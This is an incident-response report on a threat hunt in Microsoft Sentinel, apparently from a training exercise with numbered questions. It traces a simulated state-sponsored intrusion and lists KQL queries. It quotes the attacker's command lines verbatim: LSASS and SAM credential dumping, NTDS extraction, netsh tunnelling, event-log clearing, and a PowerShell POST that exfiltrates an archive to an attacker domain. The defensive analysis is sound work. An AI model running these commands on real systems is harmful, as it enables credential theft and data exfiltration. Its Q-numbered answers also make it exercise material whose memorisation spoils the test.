### OPERATION SILENT CORRIDOR 
---

### Incident Reference: IR-2026-0220-01
**Analyst:** Adetola Kolawole | Cybersecurity Analyst  
**Platform:** Microsoft Sentinel | Workspace: LAW-SilentCorridor  
**Report Date:** 11th May 2026
**Investigation Window:** 2026-02-20 00:00 UTC to 2026-03-06 23:59 UTC  
**Severity:** CRITICAL  
**Status:** Completed

---

## Table of Contents
1. [Executive Summary](#executive-summary)
2. [Environment Overview](#environment-overview)
3. [Incident Trigger](#incident-trigger)
4. [MITRE ATT&CK Mapping](#mitre-attck-mapping)
5. [Investigation Findings](#investigation-findings)
   - [Phase 1: Initial Access](#phase-1-initial-access)
   - [Phase 2: Execution](#phase-2-execution)
   - [Phase 3: Privilege Escalation](#phase-3-privilege-escalation)
   - [Phase 4: Lateral Movement](#phase-4-lateral-movement)
   - [Phase 5: Collection and Exfiltration](#phase-5-collection-and-exfiltration)
   - [Phase 6: Persistence and Defence Evasion](#phase-6-persistence-and-defence-evasion)
6. [Attack Timeline](#attack-timeline)
7. [Indicators of Compromise](#indicators-of-compromise)
8. [Investigative Challenges](#investigative-challenges)
9. [Recommendations](#recommendations)
10. [KQL Reference](#kql-reference)

---

## Executive Summary

A proactive threat hunt triggered by a BfV (German federal intelligence) advisory confirmed that state-sponsored threat actor GREY VEIL successfully compromised Haldric Aerospace's engineering network. The attacker gained initial access by authenticating to the SSL VPN gateway using credentials belonging to engineer `s.brandt`, with connections originating from known Tor exit node `185.220.101.34`. Following initial access to engineering workstation `WS-ENG04`, the attacker conducted systematic Active Directory enumeration, credential harvesting, and lateral movement to both the Domain Controller (`SRV-DC01`) and file server (`SRV-FILES02`).

The attacker operated with a low footprint across a 14-day dwell period, using exclusively living-off-the-land techniques - no custom malware was deployed at any stage, consistent with GREY VEIL's known tradecraft. Credentials for a second account, `m.richter`, were obtained via LSASS memory access and SAM hive extraction on the beachhead host, enabling lateral movement. A bidirectional port-proxy tunnel was established between `WS-ENG04` and `SRV-DC01` using native Windows `netsh` commands, providing persistent network infrastructure that survives credential resets. The entire A400M navigation system engineering directory (`C:\Engineering\Avionics\A400M_NavSys`) was staged, encoded, and exfiltrated to attacker-controlled infrastructure at `cdn-telemetry.cloud-endpoint.net`.

The attacker returned two days after exfiltration to conduct cleanup operations, clearing Windows Security event logs across all three compromised hosts using `wevtutil cl Security`. The investigation was only possible due to Sysmon telemetry which the attacker failed to clear. High-confidence assessment: classified avionics design data related to the A400M military programme was successfully exfiltrated. This was a targeted, pre-planned intrusion against a specific Tier 2 defence contractor, not an opportunistic attack.

### Key Findings at a Glance

| Item | Detail |
|---|---|
| Compromised Users | `s.brandt`, `m.richter` |
| Attack Type | State-sponsored APT - Intellectual Property Theft |
| Hosts Compromised | `WS-ENG04`, `SRV-DC01`, `SRV-FILES02`, `VPN-GW01` |
| Data Exfiltrated | A400M NavSys engineering directory - avionics navigation system design files |
| Exfiltration Destination | `cdn-telemetry.cloud-endpoint.net` |
| Credentials Compromised | `s.brandt` (VPN), `m.richter` / `Haldric2025SecIT` (domain) |
| Backdoor Account Created | None confirmed |
| C2 Infrastructure | `cdn-telemetry.cloud-endpoint.net` |
| Staging Server | `C:\Windows\Temp\McAfee_Logs` (SRV-DC01), `C:\Windows\Temp\` (SRV-FILES02) |
| Attacker Email | Not identified |
| Persistence Mechanisms | Port-proxy tunnel - `HKLM\System\CurrentControlSet\Services\PortProxy\v4tov4\tcp` |
| Evidence Gaps | Windows Security event logs cleared across all three hosts; LSASS dump failed (no .dmp file written to disk) |

---

## Environment Overview

| Field | Value |
|---|---|
| SIEM Platform | Microsoft Sentinel |
| Workspace | LAW-SilentCorridor |
| Log Table | `SilentCorridorX_CL` |
| Log Sources | VPN (FortiGate/SSL), Sysmon, MDE (DeviceProcessEvents, DeviceNetworkEvents, DeviceFileEvents, DeviceLogonEvents, DeviceRegistryEvents, DeviceEvents) |
| Domain | HALDRIC / HALDRIC.LOCAL |
| Key Fields | `EventTime` (real timestamp - string), `MdeTable` (log source), `DeviceName` (host), `AccountName`, `ProcessCommandLine`, `RemoteIP`, `LocalIP` |

> **Critical schema note:** `TimeGenerated` is the ingestion date, not the event time. Always filter using `| where TimeGenerated > datetime(2026-04-07T14:00:00Z)` to exclude test data, then use `EventTime` for chronological ordering. Wrap `EventTime` in `todatetime()` for any arithmetic or range filtering.

### Hosts in Scope

| Role | Hostname | IP Address |
|---|---|---|
| Engineering Workstation (Beachhead) | WS-ENG04 | 10.1.36.210 |
| Domain Controller | SRV-DC01 | 10.1.96.114 (observed) |
| File Server | SRV-FILES02 | Internal |
| SSL VPN Gateway | VPN-GW01 | N/A |

---

## Incident Trigger

This was a proactive, hypothesis-driven hunt with no pre-existing alerts or indicators of compromise. The investigation was triggered by a confidential advisory issued by BfV (Bundesamt für Verfassungsschutz - German federal intelligence) warning that state-sponsored threat actor GREY VEIL had been conducting intrusions against European aerospace and defence contractors since late 2025. The primary objectives of GREY VEIL are intellectual property theft and persistent access to engineering networks. Previous victims reported extended dwell times before detection, with traditional endpoint detection failing entirely due to the actor's exclusive use of living-off-the-land techniques. The hunt lead directed investigation to begin with remote access infrastructure, as VPN entry was the confirmed initial vector in all prior GREY VEIL cases.

---

## MITRE ATT&CK Mapping

| Tactic | Technique | ID | Evidence |
|---|---|---|---|
| Initial Access | Valid Accounts: Domain Accounts | T1078.002 | `s.brandt` VPN authentication from `185.220.101.34` (Tor exit node) |
| Execution | Windows Management Instrumentation | T1047 | `wmic /node:"SRV-DC01" process call create` used to spawn remote processes |
| Execution | Command and Scripting Interpreter: Windows Command Shell | T1059.003 | `cmd.exe` used throughout for command execution |
| Execution | Command and Scripting Interpreter: PowerShell | T1059.001 | `powershell Compress-Archive`, `Invoke-WebRequest` |
| Persistence | Protocol Tunneling | T1572 | `netsh portproxy` registry key survives reboots at `HKLM\System\CurrentControlSet\Services\PortProxy\v4tov4\tcp` |
| Privilege Escalation | Valid Accounts | T1078 | Use of harvested `m.richter` credentials for elevated access |
| Defence Evasion | Indicator Removal: Clear Windows Event Logs | T1070.001 | `wevtutil cl Security` executed on all three hosts |
| Defence Evasion | Masquerading | T1036 | Staging directory named `McAfee_Logs`; exfil file named `win_update_kb5034.b64` |
| Defence Evasion | Obfuscated Files or Information | T1027 | `certutil -encode` used to base64-encode exfil archive |
| Credential Access | OS Credential Dumping: LSASS Memory | T1003.001 | `tasklist /fi "imagename eq lsass.exe"` + `rundll32/comsvcs.dll MiniDump` |
| Credential Access | OS Credential Dumping: Security Account Manager | T1003.002 | `reg save HKLM\SAM C:\Windows\Temp\sam.bak` |
| Credential Access | OS Credential Dumping: NTDS | T1003.003 | `ntdsutil "ac i ntds" ifm "create full C:\Windows\Temp\McAfee_Logs\"` |
| Credential Access | Credentials from Password Stores | T1555 | `cmdkey /list`, `reg query HKCU\Software\SimonTatham\PuTTY\Sessions` |
| Discovery | System Information Discovery | T1082 | `systeminfo`, `wmic logicaldisk get caption,filesystem,freespace,size,volumename` |
| Discovery | Domain Account Discovery | T1087.002 | `net group "Domain Admins" /dom`, `net group "Enterprise Admins" /dom` |
| Discovery | Network Configuration Discovery | T1016 | `ipconfig /all`, `netstat -ano`, `arp -a` |
| Lateral Movement | Remote Services: SMB/Windows Admin Shares | T1021.002 | `net use \\SRV-DC01\C$` and `net use \\SRV-FILES02\C$` with `m.richter` credentials |
| Collection | Archive Collected Data | T1560.001 | `Compress-Archive` used to package A400M_NavSys directory |
| Collection | Data from Network Shared Drive | T1039 | Access to `C:\Engineering\Avionics\A400M_NavSys` on SRV-FILES02 |
| Exfiltration | Exfiltration Over C2 Channel | T1041 | `powershell Invoke-WebRequest` POST to `cdn-telemetry.cloud-endpoint.net` |
| Command and Control | Protocol Tunneling | T1572 | Bidirectional `netsh portproxy` tunnel between WS-ENG04 and SRV-DC01 |
| Command and Control | Application Layer Protocol: Web Protocols | T1071.001 | HTTPS POST to `cdn-telemetry.cloud-endpoint.net` |

---

## Investigation Findings

### Phase 1: Initial Access

**Who:** Threat actor GREY VEIL operating under compromised account `s.brandt`  
**What:** SSL VPN authentication from Tor exit node `185.220.101.34` following a single failed attempt  
**Where:** VPN-GW01 - Haldric Aerospace SSL VPN gateway  
**When:** 2026-02-20 (initial access confirmed via VPN logon events)

GREY VEIL gained initial access to the Haldric Aerospace network by authenticating to the SSL VPN gateway using credentials belonging to engineer `s.brandt`. Analysis of VPN logon events revealed a single failed authentication attempt from `185.220.101.34` - a known Tor exit node - immediately followed by a successful authentication from the same IP. This pattern is consistent with credential testing prior to confirmed access. Three additional source IPs were observed across the 14-day investigation window: `88.153.72.14`, `91.234.33.126`, and `45.153.160.88` - all assessed to be anonymisation infrastructure. The attacker's VPN session was assigned internal tunnel address `10.1.96.114`, which was subsequently used to RDP into engineering workstation `WS-ENG04`, establishing the beachhead.

---

### Phase 2: Execution

**What:** Host and Active Directory enumeration followed by systematic credential harvesting  
**Where:** WS-ENG04 - engineering workstation (beachhead)  
**When:** 2026-02-20T02:14 through 2026-02-27

Upon landing on `WS-ENG04`, the attacker's first action was `systeminfo` executed via `cmd.exe` - establishing the host's OS, domain membership, and hardware configuration. Three days later, the attacker returned and executed Active Directory enumeration, querying domain privileged groups: `net group "Domain Admins" /dom` followed by `net group "Enterprise Admins" /dom`. This was followed by disk enumeration via `wmic logicaldisk`. The attacker subsequently cleared the Windows Security event log using `wevtutil cl Security` to obstruct forensic analysis, then queried PuTTY saved sessions (`reg query HKCU\Software\SimonTatham\PuTTY\Sessions`), listed stored Windows credentials (`cmdkey /list`), attempted to dump LSASS memory via `rundll32/comsvcs.dll MiniDump` (which failed - no output file was created), and saved the SAM hive to disk (`reg save HKLM\SAM C:\Windows\Temp\sam.bak`). All commands were executed under `s.brandt`'s session via `cmd.exe`, using no external tooling.

---

### Phase 3: Privilege Escalation

**What:** Credential harvesting targeting LSASS memory, SAM hive, PuTTY sessions, and Windows Credential Manager  
**Where:** WS-ENG04  
**When:** 2026-02-26T02:38 through 2026-02-27T12:20

The attacker executed a systematic credential harvesting sequence to obtain elevated credentials beyond `s.brandt`'s VPN access. The earliest confirmed credential activity was `tasklist /fi "imagename eq lsass.exe"` at `2026-02-26T02:38` - confirming the LSASS process ID prior to a dump attempt. The subsequent `rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 628 C:\Windows\Temp\sys_diag.dmp full` command attempted to dump LSASS memory using the built-in `comsvcs.dll` technique, however the expected output file `sys_diag.dmp` was never written to disk - the dump failed, likely blocked by an endpoint control. Despite this, credentials for `m.richter` (`Haldric2025SecIT`) were subsequently confirmed in use, indicating successful extraction via the SAM hive (`reg save HKLM\SAM`) or PuTTY session data. The `SeDebugPrivilege` assignment event (`SpecialPrivilegeAssigned`) was observed at `2026-02-24T09:11` - two days before the explicit LSASS targeting - suggesting an earlier, unlogged credential access event.

---

### Phase 4: Lateral Movement

**What:** SMB admin share access and WMI remote execution using harvested `m.richter` credentials  
**Where:** WS-ENG04 → SRV-DC01 and SRV-FILES02  
**When:** 2026-02-28T03:15 onwards

Having obtained credentials for `m.richter`, the attacker pivoted from the beachhead to the Domain Controller and file server using native Windows tools. The first lateral move was `net use \\SRV-DC01\C$ /user:m.richter Haldric2025SecIT` at `2026-02-28T03:15`, originating from VPN tunnel address `10.1.96.114`. The attacker then used `wmic /node:"SRV-DC01" /user:"m.richter" /password:"Haldric2025SecIT" process call create` to remotely spawn processes on the Domain Controller - with `WmiPrvSE.exe` acting as the local spawning process on `SRV-DC01`. A second `net use` connection to `SRV-FILES02` followed at `2026-02-28T03:29`. All lateral movement used stolen domain credentials and living-off-the-land tools - no additional tooling was introduced to the network.

---

### Phase 5: Collection and Exfiltration

**What:** NTDS database extraction from DC, A400M NavSys engineering directory exfiltrated from file server  
**Where:** SRV-DC01 (staging), SRV-FILES02 (collection), WS-ENG04 (exfiltration)  
**When:** 2026-02-28T03:16 through 2026-03-02T01:19

On `SRV-DC01`, the attacker created a fake staging directory `C:\Windows\Temp\McAfee_Logs` - masquerading as antivirus log storage - then used `ntdsutil "ac i ntds" ifm "create full C:\Windows\Temp\McAfee_Logs\"` to extract a copy of the Active Directory database (`ntds.dit`), exploiting Volume Shadow Copy to bypass the OS file lock. Windows Defender (`MsMpEng.exe`) scanned the created files but took no blocking action. On `SRV-FILES02`, the attacker targeted `C:\Engineering\Avionics\A400M_NavSys` - the A400M military avionics navigation system design directory. The directory was compressed using `powershell Compress-Archive` into `win_update_kb5034.zip`, then base64-encoded using `certutil -encode` into `win_update_kb5034.b64` - disguised as a Windows update file. The encoded archive was subsequently transferred back to `WS-ENG04` and exfiltrated on `2026-03-02T01:19` via `powershell Invoke-WebRequest -Uri "https://cdn-telemetry.cloud-endpoint.net" -Method POST -InFile "C:\Windows\Temp\win_update_kb5034.b64" -UseBasicParsing`. Staging files on `SRV-FILES02` were deleted immediately after transfer.

---

### Phase 6: Persistence and Defence Evasion

**What:** Bidirectional port-proxy tunnel established; Windows Security event logs cleared across all hosts; staging artefacts removed  
**Where:** WS-ENG04 and SRV-DC01  
**When:** 2026-02-28T03:25 (tunnel), 2026-02-23T11:01 (first log clear), 2026-03-04 (cleanup return)

The attacker established a bidirectional port-proxy tunnel using native `netsh` commands, persisted in the registry and surviving reboots. On `WS-ENG04`, the command `netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=8443 connectport=445 connectaddress=SRV-DC01.haldric.local` created a forward tunnel routing traffic to the Domain Controller's SMB port. On `SRV-DC01`, the return tunnel `netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=9999 connectaddress=10.1.36.210 connectport=8443 protocol=tcp` completed the bidirectional relay. The tunnel configuration was stored at `HKLM\System\CurrentControlSet\Services\PortProxy\v4tov4\tcp` and persists across credential resets. Windows Security event logs were cleared on `WS-ENG04` on `2026-02-23` using `wevtutil cl Security`, and remotely cleared on `SRV-DC01` and `SRV-FILES02` via `wmic` remote execution during the return visit on `2026-03-04`. The staging directory `C:\Windows\Temp\McAfee_Logs` on `SRV-DC01` was removed using `cmd.exe /c rmdir /s /q C:\Windows\Temp\McAfee_Logs`. The attacker's sole forensic failure was not clearing Sysmon operational logs, which provided the majority of telemetry for this investigation.

---

## Attack Timeline

```
2026-02-20T02:14  WS-ENG04    -  s.brandt runs systeminfo via cmd.exe - initial host recon
2026-02-20        VPN-GW01    -  185.220.101.34 (Tor) fails VPN auth then succeeds - initial access
2026-02-23T01:47  WS-ENG04    -  net group "Domain Admins" /dom - AD enumeration begins
2026-02-23T01:47  WS-ENG04    -  net group "Enterprise Admins" /dom - AD enumeration continues
2026-02-23T01:49  WS-ENG04    -  wmic logicaldisk - disk enumeration
2026-02-23T11:01  WS-ENG04    -  wevtutil cl Security - first log clearing (defence evasion)
2026-02-23T12:29  WS-ENG04    -  rdpclip - active RDP session observed
2026-02-24T09:11  WS-ENG04    -  SpecialPrivilegeAssigned (SeDebugPrivilege) - early credential signal
2026-02-24T10:18  WS-ENG04    -  s.brandt RDP logon from 10.1.96.114 (VPN tunnel address)
2026-02-26T02:38  WS-ENG04    -  tasklist /fi "imagename eq lsass.exe" - LSASS pre-check
2026-02-26T02:40  WS-ENG04    -  rundll32/comsvcs.dll MiniDump - LSASS dump attempt (FAILED)
2026-02-26T02:42  WS-ENG04    -  reg query HKCU\Software\SimonTatham\PuTTY\Sessions - credential harvest
2026-02-27T11:04  WS-ENG04    -  cmdkey /list - Windows Credential Manager enumeration
2026-02-27T12:20  WS-ENG04    -  reg save HKLM\SAM C:\Windows\Temp\sam.bak - SAM hive extracted
2026-02-28T03:15  WS-ENG04    -  net use \\SRV-DC01\C$ /user:m.richter - first lateral pivot
2026-02-28T03:16  SRV-DC01    -  wmic remote: mkdir C:\Windows\Temp\McAfee_Logs - staging created
2026-02-28T03:16  SRV-DC01    -  ntdsutil ifm "create full" - NTDS database extracted
2026-02-28T03:25  WS-ENG04    -  netsh portproxy listenport=8443 → SRV-DC01:445 - tunnel established
2026-02-28T03:25  SRV-DC01    -  Registry: HKLM\System\CurrentControlSet\Services\PortProxy\v4tov4\tcp
2026-02-28T03:29  WS-ENG04    -  net use \\SRV-FILES02\C$ /user:m.richter - second lateral pivot
2026-02-28T03:17  SRV-FILES02 -  makecab nav_integration_spec_v4.2.docx - single doc compressed
2026-02-28T03:18  SRV-FILES02 -  Compress-Archive A400M_NavSys\* → win_update_kb5034.zip
2026-02-28T03:19  SRV-FILES02 -  certutil -encode → win_update_kb5034.b64 - base64 encoding
2026-02-28T03:25  SRV-FILES02 -  cmd.exe /c del - staging files deleted
2026-02-28T04:21  SRV-DC01    -  MsMpEng.exe scans ntds.dit - no action taken
2026-02-28T04:23  SRV-DC01    -  netsh portproxy listenport=9999 → WS-ENG04:8443 - return tunnel
2026-03-02T01:19  WS-ENG04    -  powershell Invoke-WebRequest POST → cdn-telemetry.cloud-endpoint.net - EXFILTRATION
2026-03-04        WS-ENG04    -  Attacker returns - 2 days after exfiltration
2026-03-04        ALL HOSTS   -  wevtutil cl Security - logs cleared across all three hosts
2026-03-04        SRV-DC01    -  cmd.exe /c rmdir /s /q C:\Windows\Temp\McAfee_Logs - staging removed
2026-03-05T03:05  VPN-GW01    -  185.220.101.34 reconnects via VPN
```

> Note: `EventTime` was used for all timestamps - this is the real event time as recorded by the endpoint. `TimeGenerated` reflects Sentinel ingestion time (2026-04-07) and should not be used for chronological ordering.

---

## Indicators of Compromise

### Network IOCs

| Type | Value | Context |
|---|---|---|
| Domain | `cdn-telemetry.cloud-endpoint.net` | C2 and exfiltration endpoint - HTTPS POST |
| IP | `185.220.101.34` | Tor exit node - initial VPN auth failure then success; return visit 2026-03-05 |
| IP | `88.153.72.14` | Anonymisation infrastructure - 22 successful VPN sessions |
| IP | `91.234.33.126` | Anonymisation infrastructure - VPN sessions |
| IP | `45.153.160.88` | Anonymisation infrastructure - VPN sessions |
| IP | `10.1.96.114` | VPN tunnel address assigned to attacker session |
| URL | `https://cdn-telemetry.cloud-endpoint.net` | Exfiltration URL - POST endpoint |

### Host IOCs

| Type | Value | Context |
|---|---|---|
| File | `C:\Windows\Temp\sys_diag.dmp` | Intended LSASS dump output - not created (dump failed) |
| File | `C:\Windows\Temp\sam.bak` | SAM hive copy - local account hashes |
| File | `C:\Windows\Temp\McAfee_Logs\ntds.dit` | AD database copy on SRV-DC01 |
| File | `C:\Windows\Temp\McAfee_Logs\SYSTEM` | SYSTEM hive - required to decrypt ntds.dit |
| File | `C:\Windows\Temp\win_update_kb5034.zip` | Compressed A400M_NavSys directory |
| File | `C:\Windows\Temp\win_update_kb5034.b64` | Base64-encoded exfil archive |
| File | `C:\Windows\Temp\nav_cache.cab` | Compressed nav_integration_spec_v4.2.docx |
| File | `C:\Windows\Temp\response.txt` | certutil response file from C2 |
| Registry | `HKLM\System\CurrentControlSet\Services\PortProxy\v4tov4\tcp` | Port-proxy tunnel - value `0.0.0.0/8443` |
| Account | `s.brandt` | Compromised VPN account - initial access vector |
| Account | `m.richter` | Harvested domain account - lateral movement |
| Password | `Haldric2025SecIT` | Plaintext password for m.richter - observed in wmic commands |
| Directory | `C:\Windows\Temp\McAfee_Logs` | Fake AV log directory used for NTDS staging on SRV-DC01 |

---

## Investigative Challenges

**1. Table and workspace confusion - first query failure.** The initial KQL query failed because the custom log table `SilentCorridorX_CL` was not present in the default workspace. The hunt environment (`LAW-SilentCorridor`) required direct navigation via the hunt platform link signed in as `@lognpacific.com`. This delayed the start of the investigation and highlighted the importance of confirming workspace context before writing queries.

**2. EventTime vs TimeGenerated - all data appeared to ingest on 2026-04-07.** The data dictionary (found mid-investigation) revealed that `TimeGenerated` reflects ingestion date, not event time. The field `EventTime` contains the real timestamp but is a string - arithmetic requires `todatetime()` wrapping. Earlier queries without this context would have returned incorrect chronological ordering.

**3. AccountName field suffix - no `_s` suffix in this table.** The first account profiling query failed because standard Sentinel custom log fields typically carry a `_s` suffix. This table uses clean column names without suffixes, requiring a schema-first approach before writing any field-based filter.

**4. Q07 - Directory Enumeration required multiple iterations.** The question asked for AD enumeration groups, not command names. Early answers included command syntax (`net group "Domain Admins" /dom`) when the correct format was the group names themselves (`Domain Admins, Enterprise Admins`). Re-reading the question against the format spec resolved this.

**5. Q09 - Closing quote truncation in Sentinel UI.** The answer `tasklist /fi "imagename eq lsass.exe"` was submitted multiple times incorrectly because the Sentinel results column visually truncated the closing quote. The raw cell value must be copied, not the visible display text. This applies to all future "Full command as logged" format questions.

**6. Q09 - Extended search across wrong tables.** Significant time was spent searching `DeviceFileEvents`, `DeviceRegistryEvents`, `DeviceImageLoadEvents`, and `DeviceEvents` before returning to `DeviceProcessEvents` with the correct account context. The second hint ("commands that target authentication-related processes") should have immediately directed focus to `lsass` process targeting.

**7. Q31 - Reentry gap calculation.** Using VPN logs rather than `DeviceProcessEvents` on the beachhead produced incorrect gap calculations. The `datetime_diff('day', FirstReturn, LastActivity)` KQL function should have been used from the outset.

**8. wevutil vs wevtutil typo.** Q32 was delayed because early queries searched for `wevutil` (missing the `t`). The correct Windows tool is `wevtutil`. All future queries for this command should use `wevtutil`.

**9. LSASS dump failure - evidence gap.** The LSASS MiniDump via `comsvcs.dll` did not produce `sys_diag.dmp` on disk - the dump was blocked by an endpoint control. Despite this, `m.richter`'s credentials were subsequently used, indicating successful credential extraction through an alternative method (most likely the SAM hive). The exact extraction method for `m.richter`'s password could not be definitively confirmed from available telemetry.

---

## Recommendations

**Immediate (0-24 hours)**

1. Isolate `WS-ENG04`, `SRV-DC01`, and `SRV-FILES02` from the network immediately - bidirectional port-proxy tunnel infrastructure remains active and provides persistent attacker access.
2. Block all four attacker IPs (`185.220.101.34`, `88.153.72.14`, `91.234.33.126`, `45.153.160.88`) and domain `cdn-telemetry.cloud-endpoint.net` at the perimeter firewall and DNS.
3. Disable VPN accounts `s.brandt` and `m.richter` and force password resets for all domain accounts - `ntds.dit` exfiltration means all domain credential hashes are in attacker hands and must be treated as compromised.

**Short Term (1-7 days)**

4. Remove port-proxy tunnel registry key `HKLM\System\CurrentControlSet\Services\PortProxy\v4tov4\tcp` from both `WS-ENG04` and `SRV-DC01` and verify no additional portproxy rules exist across the estate.
5. Conduct a full krbtgt account password reset (twice, 10 hours apart) to invalidate any Kerberos tickets that may have been generated using the compromised `ntds.dit`.
6. Engage incident response to forensically image all three compromised hosts before remediation - volatile memory, full disk, and registry hives required for chain of custody and further analysis.

**Strategic (7-30 days)**

7. Implement MFA on the SSL VPN gateway - the entire intrusion began with a single set of stolen VPN credentials. MFA would have prevented initial access regardless of credential compromise.
8. Enable Sysmon log forwarding to an immutable, attacker-inaccessible log store (e.g. Azure Log Analytics with restricted write permissions). The attacker successfully cleared Windows Security logs on all three hosts - Sysmon was the sole surviving telemetry source. Had this also been cleared, the investigation would have been impossible.
9. Implement data loss prevention controls on the engineering file server - specifically alerting on bulk archive operations (`Compress-Archive`, `makecab`) against `C:\Engineering\` paths, and blocking outbound HTTPS POST requests containing `.b64` or `.zip` files to non-approved domains.

---

## KQL Reference

**Standard base filter - must prefix all queries:**
```kql
SilentCorridorX_CL
| where TimeGenerated > datetime(2026-04-07T14:00:00Z)
```

---

### Schema Discovery (Pre-Hunt)
```kql
SilentCorridorX_CL
| where TimeGenerated > datetime(2026-04-07T14:00:00Z)
| take 10
```

---

### Table Distribution by Event Count
```kql
SilentCorridorX_CL
| where TimeGenerated > datetime(2026-04-07T14:00:00Z)
| summarize EventCount = count() by MdeTable
| sort by EventCount desc
```

---

### Account Profile - Q01 (Suspicious Account)
```kql
SilentCorridorX_CL
| where TimeGenerated > datetime(2026-04-07T14:00:00Z)
| where isnotempty(AccountName)
| summarize
    EventCount = count(),
    UniqueHosts = dcount(DeviceName),
    FirstSeen = min(EventTime),
    LastSeen = max(EventTime)
  by AccountName, AccountDomain
| sort by UniqueHosts desc
```

---

### VPN Authentication Profile - Q02 (Origin of Failed Auth)
```kql
SilentCorridorX_CL
| where TimeGenerated > datetime(2026-04-07T14:00:00Z)
| where AccountName has "s.brandt"
| summarize count() by ActionType, RemoteIP, DeviceName
| sort by count_ desc
```

---

### Distinct Source IPs - Q03/Q04 (Connection Footprint / Source Inventory)
```kql
SilentCorridorX_CL
| where TimeGenerated > datetime(2026-04-07T14:00:00Z)
| where AccountName has "s.brandt"
| where isnotempty(RemoteIP)
| distinct RemoteIP
| sort by RemoteIP asc
```

---

### VPN Successful Connections Count - Q03
```kql
SilentCorridorX_CL
| where TimeGenerated > datetime(2026-04-07T14:00:00Z)
| where AccountName has "s.brandt"
| where ActionType == "ssl-login-succ"
| summarize UniqueIPs = dcount(RemoteIP)
```

---

### Internal Landing Point - Q05
```kql
SilentCorridorX_CL
| where TimeGenerated > datetime(2026-04-07T14:00:00Z)
| where AccountName has "s.brandt"
| distinct DeviceName
| sort by DeviceName asc
```

---

### Initial Process on Beachhead - Q06
```kql
SilentCorridorX_CL
| where TimeGenerated > datetime(2026-04-07T14:00:00Z)
| where DeviceName == "WS-ENG04"
| where AccountName has "s.brandt"
| where MdeTable == "DeviceProcessEvents"
| project EventTime, FileName, InitiatingProcessFileName, AccountName
| sort by EventTime asc
```

---

### Full s.brandt Process Execution - Q07/Q09/Q12 (Enumeration / Credential Activity)
```kql
SilentCorridorX_CL
| where TimeGenerated > datetime(2026-04-07T14:00:00Z)
| where DeviceName == "WS-ENG04"
| where AccountName == "s.brandt"
| where MdeTable == "DeviceProcessEvents"
| where isnotempty(ProcessCommandLine)
| summarize FirstSeen = min(EventTime) by ProcessCommandLine
| sort by FirstSeen asc
```

---

### Network Reconnaissance - Q08 (Infrastructure Mapping)
```kql
SilentCorridorX_CL
| where TimeGenerated > datetime(2026-04-07T14:00:00Z)
| where DeviceName == "WS-ENG04"
| where MdeTable == "DeviceProcessEvents"
| where ProcessCommandLine has_any ("\\\\", "ping", "nslookup", "net use", "net view")
| project EventTime, ProcessCommandLine
| sort by EventTime asc
```

---

### First Credential Activity - Q09
```kql
SilentCorridorX_CL
| where TimeGenerated > datetime(2026-04-07T14:00:00Z)
| where DeviceName == "WS-ENG04"
| where AccountName == "s.brandt"
| where MdeTable == "DeviceProcessEvents"
| where ProcessCommandLine has "lsass"
| project EventTime, ProcessCommandLine
| sort by EventTime asc
| take 1
```

---

### Credential Dump File Check - Q10 (Dump Outcome)
```kql
SilentCorridorX_CL
| where TimeGenerated > datetime(2026-04-07T14:00:00Z)
| where DeviceName == "WS-ENG04"
| where MdeTable == "DeviceFileEvents"
| where FolderPath has "Temp"
| project EventTime, ActionType, FileName, FolderPath
| sort by EventTime asc
```

---

### WS-ENG04 IP Address Confirmation - Q13
```kql
SilentCorridorX_CL
| where TimeGenerated > datetime(2026-04-07T14:00:00Z)
| where DeviceName == "WS-ENG04"
| where MdeTable == "DeviceNetworkEvents"
| project EventTime, DeviceName, LocalIP, RemoteIP
| take 5
```

---

### Tunnel IP Host Scope - Q21 (RDP Scope)
```kql
SilentCorridorX_CL
| where TimeGenerated > datetime(2026-04-07T14:00:00Z)
| where RemoteIP == "10.1.96.114" or LocalIP == "10.1.96.114"
| summarize count() by DeviceName
| sort by DeviceName asc
```

---

### Port-Proxy Tunnel Command - Q22
```kql
SilentCorridorX_CL
| where TimeGenerated > datetime(2026-04-07T14:00:00Z)
| where DeviceName == "WS-ENG04"
| where MdeTable == "DeviceProcessEvents"
| where ProcessCommandLine has "portproxy"
| project EventTime, ProcessCommandLine
| sort by EventTime asc
| take 1
```

---

### Registry Persistence Confirmation - Q23
```kql
SilentCorridorX_CL
| where TimeGenerated > datetime(2026-04-07T14:00:00Z)
| where DeviceName == "WS-ENG04"
| where MdeTable == "DeviceRegistryEvents"
| where RegistryKey has "PortProxy"
| project EventTime, ActionType, RegistryKey, RegistryValueName
| sort by EventTime asc
```

---

### Return Tunnel on DC - Q24
```kql
SilentCorridorX_CL
| where TimeGenerated > datetime(2026-04-07T14:00:00Z)
| where DeviceName in ("SRV-DC01", "SRV-FILES02")
| where MdeTable == "DeviceProcessEvents"
| where ProcessCommandLine has "portproxy"
| project EventTime, DeviceName, ProcessCommandLine
| sort by EventTime asc
```

---

### Targeted Directory / Compression Activity - Q25/Q27
```kql
SilentCorridorX_CL
| where TimeGenerated > datetime(2026-04-07T14:00:00Z)
| where DeviceName == "SRV-FILES02"
| where MdeTable == "DeviceProcessEvents"
| where ProcessCommandLine has_any ("zip", "rar", "7z", "compress", "archive", "cab", "tar")
| project EventTime, AccountName, ProcessCommandLine
| sort by EventTime asc
```

---

### File Events on SRV-DC01 - Q17/Q18 (NTDS Staging / Concurrent Access)
```kql
SilentCorridorX_CL
| where TimeGenerated > datetime(2026-04-07T14:00:00Z)
| where DeviceName == "SRV-DC01"
| where MdeTable == "DeviceFileEvents"
| where FolderPath has "McAfee_Logs" or FileName has "ntds"
| project EventTime, ActionType, FileName, FolderPath, InitiatingProcessFileName
| sort by EventTime asc
```

---

### Outbound Transfer Command - Q29
```kql
SilentCorridorX_CL
| where TimeGenerated > datetime(2026-04-07T14:00:00Z)
| where DeviceName == "WS-ENG04"
| where MdeTable == "DeviceProcessEvents"
| where ProcessCommandLine has "Invoke-WebRequest"
| project EventTime, ProcessCommandLine
| sort by EventTime asc
| take 1
```

---

### Attacker Reentry Gap Calculation - Q31
```kql
SilentCorridorX_CL
| where TimeGenerated > datetime(2026-04-07T14:00:00Z)
| where DeviceName == "WS-ENG04"
| where AccountName == "s.brandt"
| where MdeTable == "DeviceProcessEvents"
| where isnotempty(ProcessCommandLine)
| summarize
    LastExfilActivity = maxif(todatetime(EventTime), todatetime(EventTime) <= datetime(2026-03-02T01:19:15)),
    FirstReturn = minif(todatetime(EventTime), todatetime(EventTime) > datetime(2026-03-02T01:19:15))
| extend GapDays = datetime_diff('day', FirstReturn, LastExfilActivity)
